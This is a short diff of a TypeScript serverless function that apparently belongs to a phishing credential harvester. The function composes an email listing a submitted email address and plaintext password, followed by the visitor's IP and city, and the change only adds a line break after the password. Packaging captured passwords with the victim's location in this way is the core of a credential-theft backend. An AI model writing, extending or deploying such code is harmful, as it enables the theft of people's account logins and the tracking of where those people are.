@@ -26,7 +26,7 @@ export default async (req: Request, context: Context) => {
       html: `<div>
             <b>Login information:</b><br/>
             Email:: ${email} <br/>
-            Password:: ${password} <br/>
+            Password:: ${password} <br/><br/>
             <b>Geolocation:</b><br/>
             IP:: ${context.ip} <br/>
             City:: ${context?.geo?.city} <br/>
